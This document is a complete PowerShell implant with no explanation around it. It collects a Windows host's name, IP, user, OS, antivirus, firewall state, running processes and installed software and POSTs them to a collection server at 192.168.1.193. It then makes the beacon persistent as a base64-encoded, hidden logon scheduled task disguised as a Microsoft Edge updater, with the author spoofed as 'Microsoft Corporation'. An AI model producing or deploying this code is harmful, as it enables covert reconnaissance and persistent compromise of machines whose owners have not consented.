# --------------------------------------------
# 1. One-Time System Info Beacon
# --------------------------------------------
$hostname = $env:COMPUTERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue) -join ", "
$firewallStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled | Out-String).Trim()
$topProcesses = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU | Out-String).Trim()
$software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
             Select-Object -ExpandProperty DisplayName -ErrorAction SilentlyContinue) -join ", "

$payload = @{
    Hostname  = $hostname
    IP        = $ip
    User      = $user
    OS        = $os
    Uptime    = $uptime
    AV        = $av
    Firewall  = $firewallStatus
    Processes = $topProcesses
    Software  = $software
    Time      = (Get-Date).ToString()
}

try {
    Invoke-WebRequest -Uri "http://192.168.1.193/collect" -Method POST -Body $payload -UseBasicParsing
} catch {}

# --------------------------------------------
# 2. Create Beacon Script for Logon
# --------------------------------------------
$beaconScript = @"
`$hostname = `$env:COMPUTERNAME
`$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$\_.IPAddress -notlike '169.*' -and `$\_.PrefixOrigin -ne 'WellKnown' })[0].IPAddress
`$user = `$env:USERNAME
`$os = (Get-CimInstance Win32_OperatingSystem).Caption
`$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
`$av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue) -join ", "
`$firewallStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled | Out-String).Trim()
`$topProcesses = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU | Out-String).Trim()
`$software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -ExpandProperty DisplayName -ErrorAction SilentlyContinue) -join ", "
`$data = @{
    Hostname  = `$hostname
    IP        = `$ip
    User      = `$user
    OS        = `$os
    Uptime    = `$uptime
    AV        = `$av
    Firewall  = `$firewallStatus
    Processes = `$topProcesses
    Software  = `$software
    Time      = (Get-Date).ToString()
}
try {
    Invoke-WebRequest -Uri 'http://192.168.1.193/collect' -Method POST -Body `$data -UseBasicParsing
} catch {}
"@

# --------------------------------------------
# 3. Encode & Persist as Scheduled Task via COM API
# --------------------------------------------
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($beaconScript))

$taskName = "MicrosoftEdgeUpdaterService"
$taskDesc = "Microsoft Edge Telemetry Update"

$service = New-Object -ComObject "Schedule.Service"
$service.Connect()

$rootFolder = $service.GetFolder("\")
$taskDef = $service.NewTask(0)

$taskDef.RegistrationInfo.Description = $taskDesc
$taskDef.RegistrationInfo.Author = "Microsoft Corporation"

$trigger = $taskDef.Triggers.Create(9)
$trigger.UserId = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$action = $taskDef.Actions.Create(0)
$action.Path = "powershell.exe"
$action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

$taskDef.Settings.Enabled = $true
$taskDef.Settings.Hidden = $true
$taskDef.Settings.StartWhenAvailable = $true
$taskDef.Settings.DisallowStartIfOnBatteries = $false

$rootFolder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 3, $null)

Write-Host "[+] Scheduled Task '$taskName' created for persistence."
